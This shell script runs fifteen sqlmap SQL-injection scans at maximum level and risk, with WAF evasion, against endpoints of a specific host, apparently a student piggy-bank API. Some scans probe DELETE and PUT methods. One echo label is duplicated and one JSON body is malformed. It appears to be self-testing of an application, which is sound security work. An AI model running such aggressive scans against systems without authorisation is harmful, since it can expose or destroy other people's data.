#!/bin/bash
 sqlmap --threads 10 -o -u "https://chic.tic.heia-fr.ch/auth?uuid=*&password=*" --dbms postgresql --os linux --level 5 --risk 3 --skip-waf --method=GET;
 echo "Test 1 on 15 done";
 sqlmap --threads 10 -o -u "https://chic.tic.heia-fr.ch/didyouknow" --dbms postgresql --os linux --level 5 --risk 3 --skip-waf --method=GET --user-agent=SQLMAP; echo "Test 2 on 15 done";
 sqlmap --threads 10 -o -u "https://chic.tic.heia-fr.ch/change/*" --dbms postgresql --os linux --level 5 --risk 3 --skip-waf --method=GET --user-agent=SQLMAP; echo "Test 3 on 15 done";
 sqlmap --threads 10 -o -u "https://chic.tic.heia-fr.ch/users" --dbms postgresql --os linux --level 5 --risk 3 --skip-waf --data='{"name": "*","password": "*","isParent":*}' --method=POST --user-agent=SQLMAP; echo "Test 3 on 15 done";
 sqlmap --threads 10 -o -u "https://chic.tic.heia-fr.ch/users" --dbms postgresql --os linux --level 5 --risk 3 --skip-waf --data='{"uuid":"*","name": "*","password": "*","isParent":*}' --method=PUT --user-agent=SQLMAP; echo "Test 4 on 15 done";
 sqlmap --threads 10 -o -u "https://chic.tic.heia-fr.ch/peggy" --dbms postgresql --os linux --level 5 --risk 3 --skip-waf --data='{"name": "*","password": "*"}' --method=POST --user-agent=SQLMAP; echo "Test 5 on 15 done";
 sqlmap --threads 10 -o -u "https://chic.tic.heia-fr.ch/peggy" --dbms postgresql --os linux --level 5 --risk 3 --skip-waf --data='{"uuid": "*","coin5": "*","coin2": "*","coin1": "*","coin50c": "*","coin20c": "*","coin10c": "*"}' --method=PUT --user-agent=SQLMAP; echo "Test 6 on 15 done";
 sqlmap --threads 10 -o -u "https://chic.tic.heia-fr.ch/objective" --dbms postgresql --os linux --level 5 --risk 3 --skip-waf --method=GET --user-agent=SQLMAP; echo "Test 7 on 15 done";
 sqlmap --threads 10 -o -u "https://chic.tic.heia-fr.ch/objective" --dbms postgresql --os linux --level 5 --risk 3 --skip-waf --data='{"name": "*","price": *,"deadline": "*"}' --method=POST --user-agent=SQLMAP; echo "Test 8 on 15 done";
 sqlmap --threads 10 -o -u "https://chic.tic.heia-fr.ch/objective" --dbms postgresql --os linux --level 5 --risk 3 --skip-waf --data='{"uuid"name": "*","price": *,"deadline": "*"}' --method=PUT --user-agent=SQLMAP; echo "Test 9 on 15 done";
 sqlmap --threads 10 -o -u "https://chic.tic.heia-fr.ch/users/*" --dbms postgresql --os linux --level 5 --risk 3 --skip-waf  --method=GET --user-agent=SQLMAP; echo "Test 10 on 15 done";
 sqlmap --threads 10 -o -u "https://chic.tic.heia-fr.ch/users/*" --dbms postgresql --os linux --level 5 --risk 3 --skip-waf  --method=DELETE --user-agent=SQLMAP; echo "Test 11 on 15 done";
 sqlmap --threads 10 -o -u "https://chic.tic.heia-fr.ch/peggy/*" --dbms postgresql --os linux --level 5 --risk 3 --skip-waf  --method=GET --user-agent=SQLMAP; echo "Test 12 on 15 done";
 sqlmap --threads 10 -o -u "https://chic.tic.heia-fr.ch/peggy/*" --dbms postgresql --os linux --level 5 --risk 3 --skip-waf  --method=DELETE --user-agent=SQLMAP; echo "Test 13 on 15 done";
 sqlmap --threads 10 -o -u "https://chic.tic.heia-fr.ch/objective/*" --dbms postgresql --os linux --level 5 --risk 3 --skip-waf  --method=GET --user-agent=SQLMAP; echo "Test 14 on 15 done";
 sqlmap --threads 10 -o -u "https://chic.tic.heia-fr.ch/objective/*" --dbms postgresql --os linux --level 5 --risk 3 --skip-waf  --method=DELETE --user-agent=SQLMAP; echo "Test 15 on 15 done";
